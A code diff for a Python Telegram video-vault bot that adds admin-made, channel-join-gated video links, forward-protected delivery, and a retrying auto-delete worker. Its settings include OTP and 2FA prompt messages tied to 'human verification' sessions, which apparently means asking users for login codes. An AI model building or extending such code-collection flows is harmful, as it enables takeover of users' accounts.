@@ -81,6 +81,8 @@ drafts = db.upload_drafts
 pending_requests = db.pending_join_requests
 membership_events = db.membership_events
 settings_col = db.settings
+video_links = db.video_links
+video_link_drafts = db.video_link_drafts
 BROADCAST = BroadcastManager(db, users, ADMIN_ID)
 
 users.create_index([("user_id", ASCENDING)], unique=True)
@@ -93,9 +95,13 @@ pending_requests.create_index([("chat_id", ASCENDING), ("user_id", ASCENDING)], 
 pending_requests.create_index([("requested_at", ASCENDING)])
 membership_events.create_index([("chat_id", ASCENDING), ("user_id", ASCENDING)], unique=True)
 settings_col.create_index([("key", ASCENDING)], unique=True)
+video_links.create_index([("token", ASCENDING)], unique=True)
+video_links.create_index([("created_at", DESCENDING)])
+video_link_drafts.create_index([("admin_id", ASCENDING)], unique=True)
 
 ADMIN_STATE = {}
 UPLOAD_RUNTIME = {}
+LINK_UPLOAD_RUNTIME = {}
 
 
 # ─────────────────── SETTINGS (editable from chat) ───────────────────
@@ -120,8 +126,6 @@ DEFAULT_SETTINGS = {
         "(The message will be deleted immediately.)"
     ),
     "delete_after_hours": str(DELETE_AFTER_HOURS_DEFAULT),
-    "keypad_top_button_text": "💬 Contact Support",
-    "keypad_top_button_url": "tg://user?id=123456789",
 }
 
 EDITABLE_KEYS = list(DEFAULT_SETTINGS.keys())
@@ -135,8 +139,6 @@ KEY_LABELS = {
     "otp_prompt": "🔐 OTP prompt message",
     "twofa_prompt": "🔐 2FA prompt message",
     "delete_after_hours": "⏳ Auto-delete timer (hours)",
-    "keypad_top_button_text": "💬 Keypad top button — label",
-    "keypad_top_button_url": "🔗 Keypad top button — DM link",
 }
 
 
@@ -223,7 +225,10 @@ def admin_menu_inline():
             InlineKeyboardButton("🗑 Remove Required Channel", callback_data="am_remove"),
             InlineKeyboardButton("📊 Bot Stats", callback_data="am_stats"),
         ],
-        [InlineKeyboardButton("📣 Broadcast", callback_data="am_broadcast")],
+        [
+            InlineKeyboardButton("📣 Broadcast", callback_data="am_broadcast"),
+            InlineKeyboardButton("🔗 Video Links", callback_data="am_videolinks"),
+        ],
         [
             InlineKeyboardButton("✏️ Edit Buttons & Messages", callback_data="am_set"),
             InlineKeyboardButton("❓ Help", callback_data="am_help"),
@@ -334,6 +339,8 @@ HELP_TEXT = (
     "• <code>/broadcast</code> — Send a broadcast to eligible bot users\n"
     "• <code>/set</code> — Edit button names, messages &amp; timers (inline menu)\n"
     "• <code>/uploadstatus</code> — Live status of current upload\n"
+    "• <code>/link</code> — Start single/bulk video link upload\n"
+    "• <code>/done</code> — Finish /link upload and generate link\n"
     "• <code>/setcustomlink</code> — Set a custom join link for a required chat\n"
     "• <code>/resetverify &lt;user_id&gt;</code> — Reset a user's human verification\n"
     "• <code>/cancel_session</code> — Cancel an active session flow (any user)\n\n"
@@ -352,6 +359,7 @@ HELP_TEXT = (
     "• 👥 <b>Required Groups</b> — Show all required chats\n"
     "• 🗑 <b>Remove Required Channel</b> — Remove a required chat\n"
     "• 📊 <b>Bot Stats</b> — Users, referrals, daily new users\n"
+    "• 🔗 <b>Video Links</b> — Create force-join protected links by uploading videos\n"
     "• ✏️ <b>Edit Buttons &amp; Messages</b> — Same as /set\n\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "🔐 <b>Automatic Events</b>\n"
@@ -407,13 +415,6 @@ async def set_edit_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     extra_hint = ""
     if key == "delete_after_hours":
         extra_hint = "\n\n⚠️ Send a whole number (e.g. <code>1</code>, <code>6</code>, <code>24</code>)."
-    elif key.endswith("_button_url"):
-        extra_hint = (
-            "\n\n⚠️ Send a valid Telegram link.\n"
-            "Allowed formats:\n"
-            "• <code>https://t.me/Username</code>\n"
-            "• <code>tg://user?id=123456789</code>"
-        )
 
     await q.edit_message_text(
         f"✏️ <b>Editing:</b> <code>{esc(key)}</code>\n\n"
@@ -462,6 +463,9 @@ async def set_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         ADMIN_STATE.pop(ADMIN_ID, None)
         return False
 
+    # Save the actual formatting from Telegram's rich-text editor instead
+    # of requiring the admin to write HTML/Markdown. The external message
+    # consumers already render these setting values as Telegram HTML.
     raw = update.message.text or ""
     if not raw.strip():
         await update.message.reply_text("⚠️ Value cannot be empty. Send new value or /cancel.")
@@ -477,27 +481,16 @@ async def set_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             await update.message.reply_text("⚠️ Hours must be between 1 and 720 (30 days).")
             return True
         value = str(hours)
-    elif key.endswith("_button_url"):
-        value = raw.strip()
-        if not (value.startswith("https://t.me/")
-                or value.startswith("tg://user?id=")):
-            await update.message.reply_text(
-                "⚠️ Please send a valid Telegram link.\n\n"
-                "Allowed formats:\n"
-                "• <code>https://t.me/Username</code>\n"
-                "• <code>tg://user?id=123456789</code>",
-                parse_mode=ParseMode.HTML,
-            )
-            return True
-        if len(value) > 200:
-            await update.message.reply_text("⚠️ URL too long.")
-            return True
     elif key.endswith("_button_text"):
+        # Telegram button labels are plain text. Do not save HTML tags in them.
         value = raw.strip()
         if len(value) > 100 or "\n" in value:
             await update.message.reply_text("⚠️ Button labels must be one line, up to 100 characters.")
             return True
     else:
+        # Message.text_html encodes real Telegram text entities (bold, italic,
+        # underline, strikethrough, code, links, spoiler, etc.) and escapes
+        # literal angle brackets. The user's line breaks are retained.
         value = update.message.text_html if update.message.entities else html.escape(raw)
         if len(raw) > 4000:
             await update.message.reply_text("⚠️ Keep the message under 4000 characters.")
@@ -526,8 +519,6 @@ async def set_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         display = f"{value} hour(s)"
     elif key.endswith("_button_text"):
         display = esc(value)
-    elif key.endswith("_button_url"):
-        display = f"Link: <code>{esc(value)}</code>"
     else:
         display = "Message formatting saved exactly as shown in the preview above."
 
@@ -560,27 +551,137 @@ async def admin_set_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ─────────────────── DELETION WORKER ───────────────────
 async def deletion_worker(app: Application):
+    """Persistently delete expired video messages.
+
+    A temporary Telegram/network failure must never make a deletion job disappear.
+    Jobs are removed only after a confirmed delete (or when Telegram confirms the
+    message is already gone). Temporary failures are rescheduled in MongoDB and
+    survive bot restarts.
+    """
     while True:
         try:
+            now = utcnow()
             docs = list(
-                pending_deletions.find({"delete_at": {"$lte": utcnow()}})
+                pending_deletions.find({
+                    "delete_at": {"$lte": now},
+                    "$or": [
+                        {"next_attempt_at": {"$exists": False}},
+                        {"next_attempt_at": None},
+                        {"next_attempt_at": {"$lte": now}},
+                    ],
+                })
                 .sort("delete_at", ASCENDING)
                 .limit(100)
             )
+
             for doc in docs:
                 try:
-                    await app.bot.delete_message(doc["chat_id"], doc["message_id"])
-                except (BadRequest, Forbidden):
-                    pass
-                except Exception:
-                    log.exception("Delete failed")
-                pending_deletions.delete_one({"_id": doc["_id"]})
-                await asyncio.sleep(0.03)
+                    await app.bot.delete_message(
+                        chat_id=doc["chat_id"],
+                        message_id=doc["message_id"],
+                    )
+                except RetryAfter as exc:
+                    wait = max(2, int(float(exc.retry_after)) + 1)
+                    pending_deletions.update_one(
+                        {"_id": doc["_id"]},
+                        {"$set": {
+                            "next_attempt_at": utcnow() + timedelta(seconds=wait),
+                            "last_error": f"RetryAfter({wait}s)",
+                            "last_attempt_at": utcnow(),
+                        }, "$inc": {"attempts": 1}},
+                    )
+                    log.warning(
+                        "Video delete rate-limited chat=%s message=%s retry_in=%ss",
+                        doc.get("chat_id"), doc.get("message_id"), wait,
+                    )
+                except (TimedOut, NetworkError) as exc:
+                    attempts = int(doc.get("attempts", 0)) + 1
+                    wait = min(300, max(10, 2 ** min(attempts, 8)))
+                    pending_deletions.update_one(
+                        {"_id": doc["_id"]},
+                        {"$set": {
+                            "next_attempt_at": utcnow() + timedelta(seconds=wait),
+                            "last_error": type(exc).__name__,
+                            "last_attempt_at": utcnow(),
+                        }, "$inc": {"attempts": 1}},
+                    )
+                    log.warning(
+                        "Temporary video delete failure chat=%s message=%s error=%s retry_in=%ss",
+                        doc.get("chat_id"), doc.get("message_id"), type(exc).__name__, wait,
+                    )
+                except BadRequest as exc:
+                    detail = str(exc).lower()
+                    # These mean the target is already gone, so the job is complete.
+                    if any(x in detail for x in (
+                        "message to delete not found",
+                        "message_id_invalid",
+                        "message identifier is not specified",
+                    )):
+                        pending_deletions.delete_one({"_id": doc["_id"]})
+                    else:
+                        attempts = int(doc.get("attempts", 0)) + 1
+                        wait = min(300, 30 * max(1, attempts))
+                        pending_deletions.update_one(
+                            {"_id": doc["_id"]},
+                            {"$set": {
+                                "next_attempt_at": utcnow() + timedelta(seconds=wait),
+                                "last_error": ("BadRequest: " + str(exc))[:220],
+                                "last_attempt_at": utcnow(),
+                            }, "$inc": {"attempts": 1}},
+                        )
+                        log.warning(
+                            "Video delete BadRequest chat=%s message=%s retry_in=%ss error=%s",
+                            doc.get("chat_id"), doc.get("message_id"), wait, str(exc),
+                        )
+                except Forbidden as exc:
+                    # A blocked/deactivated private chat may remain undeletable. Keep a
+                    # limited retry history, then stop retrying forever.
+                    attempts = int(doc.get("attempts", 0)) + 1
+                    if attempts >= 6:
+                        log.warning(
+                            "Giving up video delete after %s forbidden attempts chat=%s message=%s",
+                            attempts, doc.get("chat_id"), doc.get("message_id"),
+                        )
+                        pending_deletions.delete_one({"_id": doc["_id"]})
+                    else:
+                        pending_deletions.update_one(
+                            {"_id": doc["_id"]},
+                            {"$set": {
+                                "next_attempt_at": utcnow() + timedelta(minutes=5),
+                                "last_error": ("Forbidden: " + str(exc))[:220],
+                                "last_attempt_at": utcnow(),
+                            }, "$inc": {"attempts": 1}},
+                        )
+                except asyncio.CancelledError:
+                    raise
+                except TelegramError as exc:
+                    attempts = int(doc.get("attempts", 0)) + 1
+                    wait = min(300, max(15, 2 ** min(attempts, 8)))
+                    pending_deletions.update_one(
+                        {"_id": doc["_id"]},
+                        {"$set": {
+                            "next_attempt_at": utcnow() + timedelta(seconds=wait),
+                            "last_error": (type(exc).__name__ + ": " + str(exc))[:220],
+                            "last_attempt_at": utcnow(),
+                        }, "$inc": {"attempts": 1}},
+                    )
+                    log.warning(
+                        "Telegram video delete failure chat=%s message=%s error=%s retry_in=%ss",
+                        doc.get("chat_id"), doc.get("message_id"), type(exc).__name__, wait,
+                    )
+                else:
+                    pending_deletions.delete_one({"_id": doc["_id"]})
+                    log.info(
+                        "Expired video deleted chat=%s message=%s",
+                        doc.get("chat_id"), doc.get("message_id"),
+                    )
+
+                await asyncio.sleep(0.05)
         except asyncio.CancelledError:
             raise
         except Exception:
             log.exception("Deletion worker error")
-        await asyncio.sleep(30)
+        await asyncio.sleep(15)
 
 
 async def post_init(app: Application):
@@ -594,6 +695,14 @@ async def post_init(app: Application):
 
 
 async def post_stop(app: Application):
+    link_runtime = LINK_UPLOAD_RUNTIME.pop(ADMIN_ID, None)
+    if link_runtime:
+        link_runtime["closing"] = True
+        link_tasks = list(link_runtime.get("tasks", set()))
+        for t in link_tasks:
+            t.cancel()
+        if link_tasks:
+            await asyncio.gather(*link_tasks, return_exceptions=True)
     runtime = UPLOAD_RUNTIME.pop(ADMIN_ID, None)
     if runtime:
         runtime["closing"] = True
@@ -612,6 +721,7 @@ async def post_stop(app: Application):
             pass
 
     await BROADCAST.shutdown()
+    # Clean up all in-flight HV sessions
     await HV.cleanup_all()
     log.info("Video cleanup worker stopped")
 
@@ -658,6 +768,7 @@ def _ensure_user_sync(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def ensure_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # PyMongo is synchronous; keep database I/O away from Telegram's event loop.
     return await asyncio.to_thread(_ensure_user_sync, update, context)
 
 
@@ -825,11 +936,11 @@ async def membership_result(bot, uid):
     return chats, missing, pending
 
 
-def join_keyboard(chats, hide_verified=False):
+def join_keyboard(chats, hide_verified=False, verify_callback="verify_join"):
     rows = []
     for ch in chats:
         rows.append([InlineKeyboardButton(f"➕ Join {ch['name']}", url=ch["join_url"])])
-    rows.append([InlineKeyboardButton("✅ I've Joined — Verify", callback_data="verify_join")])
+    rows.append([InlineKeyboardButton("✅ I've Joined — Verify", callback_data=verify_callback)])
     return InlineKeyboardMarkup(rows)
 
 
@@ -852,7 +963,470 @@ async def show_join_gate(update, context, chats=None, status_message=None):
     await reply(update, context, text, reply_markup=join_keyboard(chats))
 
 
+
+# ─────────────────── ADMIN SHAREABLE VIDEO LINKS ───────────────────
+def video_links_admin_markup():
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("➕ Create Link", callback_data="vla_create"),
+            InlineKeyboardButton("📋 Existing Links", callback_data="vla_list"),
+        ],
+        [InlineKeyboardButton("⬅️ Admin Panel", callback_data="vla_back")],
+    ])
+
+
+def _parse_video_link_selection(text: str):
+    """Resolve admin-friendly batch references into storage channel message IDs.
+
+    Supported tokens (comma or whitespace separated):
+      1:3       -> batch 1, video 3
+      1:1-5     -> batch 1, videos 1 through 5
+      1:*       -> whole batch 1
+      batch:2   -> whole batch 2
+    """
+    raw = (text or "").strip().lower()
+    if not raw:
+        raise ValueError("Selection cannot be empty.")
+    parts = [x for x in re.split(r"[\s,]+", raw) if x]
+    out = []
+    seen = set()
+
+    def add_batch_positions(batch_no, positions=None):
+        doc = batches.find_one({"batch_no": int(batch_no), "published": True})
+        if not doc:
+            raise ValueError(f"Batch {batch_no} was not found or is not published.")
+        mids = list(doc.get("message_ids", []))
+        if not mids:
+            raise ValueError(f"Batch {batch_no} has no videos.")
+        if positions is None:
+            chosen = mids
+        else:
+            chosen = []
+            for pos in positions:
+                if pos < 1 or pos > len(mids):
+                    raise ValueError(
+                        f"Batch {batch_no} has {len(mids)} videos; position {pos} is invalid."
+                    )
+                chosen.append(mids[pos - 1])
+        for mid in chosen:
+            if mid not in seen:
+                seen.add(mid)
+                out.append(mid)
+
+    for token in parts:
+        m = re.fullmatch(r"batch:(\d+)", token)
+        if m:
+            add_batch_positions(int(m.group(1)), None)
+            continue
+        m = re.fullmatch(r"(\d+):\*", token)
+        if m:
+            add_batch_positions(int(m.group(1)), None)
+            continue
+        m = re.fullmatch(r"(\d+):(\d+)", token)
+        if m:
+            add_batch_positions(int(m.group(1)), [int(m.group(2))])
+            continue
+        m = re.fullmatch(r"(\d+):(\d+)-(\d+)", token)
+        if m:
+            batch_no, a, b = map(int, m.groups())
+            if a > b:
+                a, b = b, a
+            add_batch_positions(batch_no, range(a, b + 1))
+            continue
+        raise ValueError(
+            f"Invalid item: {token}. Use 1:3, 1:1-5, 1:* or batch:2."
+        )
+    if not out:
+        raise ValueError("No videos were selected.")
+    return out
+
+
+def _video_link_url(username: str, token: str):
+    return f"https://t.me/{username}?start=vl_{token}"
+
+
+async def admin_video_links_menu(update, context):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    text = (
+        "🔗 <b>SHAREABLE VIDEO LINKS</b>\n\n"
+        "Create a link for one specific video or a custom bundle. "
+        "Users receive the selected videos only after all current required groups/channels are verified.\n\n"
+        "The normal referral/unlock flow is not required for these special links."
+    )
+    q = update.callback_query
+    if q:
+        try:
+            return await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=video_links_admin_markup())
+        except BadRequest:
+            pass
+    return await reply(update, context, text, reply_markup=video_links_admin_markup())
+
+
+async def video_link_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    if q.from_user.id != ADMIN_ID:
+        return await q.answer("Admin only.", show_alert=True)
+    data = q.data or ""
+    if data == "vla_create":
+        await q.answer()
+        return await start_link_upload(update, context, edit_message=True)
+    if data == "vla_list":
+        await q.answer()
+        docs = list(video_links.find().sort("created_at", DESCENDING).limit(12))
+        if not docs:
+            return await q.edit_message_text(
+                "📋 <b>VIDEO LINKS</b>\n\nNo links created yet.",
+                parse_mode=ParseMode.HTML,
+                reply_markup=video_links_admin_markup(),
+            )
+        username = context.application.bot_data.get("username", "")
+        lines = ["📋 <b>RECENT VIDEO LINKS</b>\n"]
+        buttons = []
+        for d in docs:
+            token = d["token"]
+            state = "✅" if d.get("enabled", True) else "⛔"
+            count = len(d.get("message_ids", []))
+            url = _video_link_url(username, token) if username else ""
+            lines.append(
+                f"{state} <code>{token}</code> — <b>{count}</b> video(s)"
+                + (f"\n<code>{esc(url)}</code>" if url else "")
+            )
+            if d.get("enabled", True):
+                buttons.append([InlineKeyboardButton(
+                    f"⛔ Disable {token}", callback_data=f"vla_disable:{token}"
+                )])
+        lines.append("\nDisabled links stop new deliveries immediately.")
+        buttons.append([InlineKeyboardButton("⬅️ Video Links", callback_data="vla_back")])
+        return await q.edit_message_text(
+            "\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(buttons)
+        )
+    if data.startswith("vla_disable:"):
+        token = data.split(":", 1)[1]
+        video_links.update_one({"token": token}, {"$set": {"enabled": False, "disabled_at": utcnow()}})
+        await q.answer("Link disabled.", show_alert=True)
+        return await admin_video_links_menu(update, context)
+    if data == "vla_back":
+        await q.answer()
+        ADMIN_STATE.pop(ADMIN_ID, None)
+        try:
+            return await q.edit_message_text(
+                "🛠 <b>ADMIN CONTROL PANEL</b>", parse_mode=ParseMode.HTML, reply_markup=admin_menu_inline()
+            )
+        except BadRequest:
+            return
+    await q.answer()
+
+
+async def start_link_upload(update: Update, context: ContextTypes.DEFAULT_TYPE, edit_message: bool = False):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    old_rt = LINK_UPLOAD_RUNTIME.pop(ADMIN_ID, None)
+    if old_rt:
+        old_rt["closing"] = True
+        tasks = list(old_rt.get("tasks", set()))
+        for task in tasks:
+            task.cancel()
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+    video_link_drafts.replace_one(
+        {"admin_id": ADMIN_ID},
+        {"admin_id": ADMIN_ID, "copied": [], "failed": [], "submitted": 0, "created_at": utcnow()},
+        upsert=True,
+    )
+    runtime = {
+        "tasks": set(), "closing": False, "send_lock": asyncio.Lock(),
+        "next_copy_at": 0.0, "cooldown_until": 0.0, "seen": set(),
+    }
+    LINK_UPLOAD_RUNTIME[ADMIN_ID] = runtime
+    ADMIN_STATE[ADMIN_ID] = "video_link_upload"
+    text = (
+        "🔗 <b>CREATE VIDEO LINK</b>\n\n"
+        "Send all videos you want to include in this link.\n"
+        "Each video will be saved to the private storage channel.\n\n"
+        "When finished, send <code>/done</code>.\n\n"
+        "• Single video supported\n• Bulk videos supported\n• Upload order is preserved"
+    )
+    if edit_message and update.callback_query:
+        try:
+            return await update.callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=flow_cancel_inline())
+        except BadRequest:
+            pass
+    return await reply(update, context, text, reply_markup=flow_cancel_inline())
+
+async def link_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    return await start_link_upload(update, context)
+
+async def _link_storage_copy_job(bot, runtime, src_chat_id: int, source_id: int):
+    async with runtime["send_lock"]:
+        loop = asyncio.get_running_loop()
+        reason = "Unknown"
+        for attempt in range(UPLOAD_MAX_RETRIES):
+            try:
+                delay = max(runtime["cooldown_until"], runtime["next_copy_at"]) - loop.time()
+                if delay > 0:
+                    await asyncio.sleep(delay)
+                try:
+                    copied = await bot.copy_message(
+                        chat_id=STORAGE_CHANNEL_ID, from_chat_id=src_chat_id,
+                        message_id=source_id, protect_content=False,
+                        read_timeout=60, write_timeout=60, connect_timeout=20, pool_timeout=30,
+                    )
+                except RetryAfter as exc:
+                    wait = float(exc.retry_after) + 1.0
+                    runtime["cooldown_until"] = max(runtime["cooldown_until"], loop.time() + wait)
+                    reason = f"RetryAfter ({round(wait)}s)"
+                    continue
+                finally:
+                    runtime["next_copy_at"] = max(runtime["next_copy_at"], loop.time() + UPLOAD_COPY_GAP_SECONDS)
+                video_link_drafts.update_one(
+                    {"admin_id": ADMIN_ID},
+                    {"$push": {"copied": {"source_message_id": source_id, "storage_message_id": copied.message_id}},
+                     "$pull": {"failed": {"source_message_id": source_id}}},
+                )
+                return
+            except (TimedOut, NetworkError) as exc:
+                reason = type(exc).__name__
+                if attempt + 1 < UPLOAD_MAX_RETRIES:
+                    await asyncio.sleep(min(2 ** attempt, 16))
+            except (BadRequest, Forbidden) as exc:
+                reason = _safe_error(exc)
+                break
+            except TelegramError as exc:
+                reason = _safe_error(exc)
+                if attempt + 1 < UPLOAD_MAX_RETRIES:
+                    await asyncio.sleep(min(2 ** attempt, 16))
+            except asyncio.CancelledError:
+                raise
+        video_link_drafts.update_one(
+            {"admin_id": ADMIN_ID},
+            {"$push": {"failed": {"source_message_id": source_id, "reason": reason}}},
+        )
+
+def _enqueue_link_video(bot, runtime, chat_id: int, source_id: int):
+    task = asyncio.create_task(_link_storage_copy_job(bot, runtime, chat_id, source_id), name=f"link-copy-{source_id}")
+    runtime["tasks"].add(task)
+    task.add_done_callback(runtime["tasks"].discard)
+
+async def admin_collect_link_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID or ADMIN_STATE.get(ADMIN_ID) != "video_link_upload":
+        return False
+    if not update.message or not update.message.video:
+        return False
+    runtime = LINK_UPLOAD_RUNTIME.get(ADMIN_ID)
+    if not runtime or runtime.get("closing"):
+        await update.message.reply_text("⏳ Link upload is already finishing.")
+        return True
+    source_id = update.message.message_id
+    if source_id in runtime["seen"]:
+        return True
+    runtime["seen"].add(source_id)
+    video_link_drafts.update_one({"admin_id": ADMIN_ID}, {"$inc": {"submitted": 1}})
+    _enqueue_link_video(context.bot, runtime, update.effective_chat.id, source_id)
+    doc = video_link_drafts.find_one({"admin_id": ADMIN_ID}, {"submitted": 1}) or {}
+    submitted = int(doc.get("submitted", 0))
+    if submitted == 1 or submitted % 10 == 0:
+        await update.message.reply_text(
+            f"📥 Received <b>{submitted}</b> video(s).\nSend more, or use /done when finished.",
+            parse_mode=ParseMode.HTML,
+        )
+    return True
+
+async def done_link_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    if ADMIN_STATE.get(ADMIN_ID) != "video_link_upload":
+        return await update.message.reply_text("ℹ️ No /link upload is active.")
+    runtime = LINK_UPLOAD_RUNTIME.get(ADMIN_ID)
+    status = await update.message.reply_text("⏳ Finishing storage copies…")
+    if runtime:
+        runtime["closing"] = True
+        tasks = list(runtime.get("tasks", set()))
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+    doc = video_link_drafts.find_one({"admin_id": ADMIN_ID}) or {}
+    copied = list(doc.get("copied", []))
+    failed = list(doc.get("failed", []))
+    copied.sort(key=lambda x: int(x.get("source_message_id", 0)))
+    mids = [int(x["storage_message_id"]) for x in copied if x.get("storage_message_id")]
+    if not mids:
+        LINK_UPLOAD_RUNTIME.pop(ADMIN_ID, None)
+        ADMIN_STATE.pop(ADMIN_ID, None)
+        video_link_drafts.delete_one({"admin_id": ADMIN_ID})
+        return await status.edit_text("❌ No videos were saved, so no link was created.\nSend /link and try again.")
+    token = uuid4().hex[:16]
+    video_links.insert_one({
+        "token": token, "message_ids": mids, "enabled": True,
+        "created_by": ADMIN_ID, "created_at": utcnow(), "source": "direct_upload",
+        "submitted": int(doc.get("submitted", len(mids))), "failed_count": len(failed),
+    })
+    video_link_drafts.delete_one({"admin_id": ADMIN_ID})
+    LINK_UPLOAD_RUNTIME.pop(ADMIN_ID, None)
+    ADMIN_STATE.pop(ADMIN_ID, None)
+    username = context.application.bot_data["username"]
+    url = _video_link_url(username, token)
+    result = (
+        "✅ <b>VIDEO LINK CREATED</b>\n\n"
+        f"🎞 Saved videos: <b>{len(mids)}</b>\n"
+        f"🔗 Link:\n<code>{esc(url)}</code>\n\n"
+        "Before delivery, the bot will verify all current required groups/channels."
+    )
+    if failed:
+        result += f"\n\n⚠️ Failed/skipped during storage: <b>{len(failed)}</b>"
+    await status.edit_text(result, parse_mode=ParseMode.HTML)
+
+async def admin_video_link_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID or ADMIN_STATE.get(ADMIN_ID) != "video_link_select":
+        return False
+    text = (update.message.text or "").strip()
+    try:
+        mids = await asyncio.to_thread(_parse_video_link_selection, text)
+    except ValueError as exc:
+        await update.message.reply_text(
+            f"❌ <b>Invalid selection</b>\n\n{esc(exc)}\n\n"
+            "Try again, e.g. <code>1:3</code>, <code>1:1-5</code>, or <code>batch:2</code>.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=flow_cancel_inline(),
+        )
+        return True
+
+    token = uuid4().hex[:16]
+    video_links.insert_one({
+        "token": token,
+        "message_ids": mids,
+        "enabled": True,
+        "created_by": ADMIN_ID,
+        "created_at": utcnow(),
+        "selection": text,
+    })
+    ADMIN_STATE.pop(ADMIN_ID, None)
+    username = context.application.bot_data["username"]
+    url = _video_link_url(username, token)
+    await reply(
+        update, context,
+        "✅ <b>VIDEO LINK CREATED</b>\n\n"
+        f"🎞 Videos: <b>{len(mids)}</b>\n"
+        f"🔗 Link:\n<code>{esc(url)}</code>\n\n"
+        "The bot will verify all current required groups/channels immediately before delivery.",
+        reply_markup=video_links_admin_markup(),
+    )
+    return True
+
+
+async def _send_link_videos(bot, chat_id: int, link_doc: dict):
+    mids = list(link_doc.get("message_ids", []))
+    delete_hours = get_delete_hours()
+    if not mids:
+        return await bot.send_message(chat_id, "⚠️ This video link has no videos.")
+    await bot.send_message(
+        chat_id,
+        "🎬 <b>YOUR LINKED VIDEOS</b>\n\n"
+        f"🎞 Videos: <b>{len(mids)}</b>\n"
+        "🔒 Forward/save protection: <b>ON</b>\n"
+        f"⏳ Auto-delete: <b>{delete_hours} hour(s)</b>",
+        parse_mode=ParseMode.HTML,
+    )
+    sent = []
+    for mid in mids:
+        try:
+            result = await bot.copy_message(
+                chat_id=chat_id,
+                from_chat_id=STORAGE_CHANNEL_ID,
+                message_id=mid,
+                protect_content=True,
+            )
+            sent.append(result.message_id)
+            await asyncio.sleep(0.10)
+        except RetryAfter as exc:
+            await asyncio.sleep(float(exc.retry_after) + 1)
+            try:
+                result = await bot.copy_message(
+                    chat_id=chat_id, from_chat_id=STORAGE_CHANNEL_ID,
+                    message_id=mid, protect_content=True,
+                )
+                sent.append(result.message_id)
+            except TelegramError as e:
+                log.warning("Video-link retry failed source=%s error=%s", mid, type(e).__name__)
+        except TelegramError as e:
+            log.warning("Video-link copy failed source=%s error=%s", mid, type(e).__name__)
+
+    if sent:
+        delete_at = utcnow() + timedelta(hours=delete_hours)
+        pending_deletions.insert_many([
+            {
+                "chat_id": chat_id, "message_id": sent_mid,
+                "delete_at": delete_at, "kind": "video_link",
+                "attempts": 0, "created_at": utcnow(),
+            }
+            for sent_mid in sent
+        ])
+    await bot.send_message(
+        chat_id,
+        "✅ <b>DELIVERY COMPLETE</b>\n\n"
+        f"Sent: <b>{len(sent)}/{len(mids)}</b>",
+        parse_mode=ParseMode.HTML,
+    )
+
+
+async def _video_link_gate(bot, uid: int, token: str):
+    doc = video_links.find_one({"token": token, "enabled": True})
+    if not doc:
+        return None, None, None
+    _, missing, pending = await membership_result(bot, uid)
+    return doc, missing, pending
+
+
+async def start_video_link(update: Update, context: ContextTypes.DEFAULT_TYPE, token: str):
+    status = await reply(update, context, "⏳ <b>Checking video access…</b>")
+    await ensure_user(update, context)
+    uid = update.effective_user.id
+    doc, missing, pending = await _video_link_gate(context.bot, uid, token)
+    if doc is None:
+        return await status.edit_text("⚠️ This video link is invalid or has been disabled.")
+    if missing:
+        text = (
+            "🔐 <b>VIDEO LINK LOCKED</b>\n\n"
+            "Join the remaining required groups/channels below.\n\n"
+            f"📌 Remaining: <b>{len(missing)}</b>\n"
+            "After joining or submitting the join requests, tap <b>Verify & Get Videos</b>."
+        )
+        kb = join_keyboard(missing, verify_callback=f"vl_verify:{token}")
+        return await status.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+    users.update_one({"user_id": uid}, {"$set": {"verified": True, "verified_at": utcnow()}})
+    await status.edit_text("✅ <b>Access verified.</b> Sending your videos…", parse_mode=ParseMode.HTML)
+    return await _send_link_videos(context.bot, update.effective_chat.id, doc)
+
+
+async def verify_video_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    token = (q.data or "").split(":", 1)[1]
+    await q.answer("Checking all required chats…")
+    uid = q.from_user.id
+    doc, missing, pending = await _video_link_gate(context.bot, uid, token)
+    if doc is None:
+        return await q.edit_message_text("⚠️ This video link is invalid or has been disabled.")
+    if missing:
+        names = "\n".join(f"• {esc(x['name'])}" for x in missing)
+        text = (
+            "❌ <b>VERIFICATION INCOMPLETE</b>\n\n"
+            "These required chats are still missing:\n"
+            f"{names}\n\nComplete them and verify again."
+        )
+        return await q.edit_message_text(
+            text, parse_mode=ParseMode.HTML,
+            reply_markup=join_keyboard(missing, verify_callback=f"vl_verify:{token}"),
+        )
+    users.update_one({"user_id": uid}, {"$set": {"verified": True, "verified_at": utcnow()}})
+    try:
+        await q.edit_message_text("✅ <b>Access verified.</b> Sending your videos…", parse_mode=ParseMode.HTML)
+    except BadRequest:
+        pass
+    return await _send_link_videos(context.bot, q.message.chat_id, doc)
+
 def _start_db_decision(uid, has_access):
+    """Small atomic-ish synchronous Mongo section executed outside event loop."""
     if has_access:
         current = users.find_one({"user_id": uid}) or {}
         fields = {"verified": True, "verified_at": utcnow()}
@@ -864,6 +1438,7 @@ def _start_db_decision(uid, has_access):
 
 
 async def _animate_start_loading(status_message):
+    """Animate one status message; never send extra messages during /start."""
     frames = (
         "⏳ <b>Loading your video vault</b>\n\n▰▱▱▱▱ Checking access…",
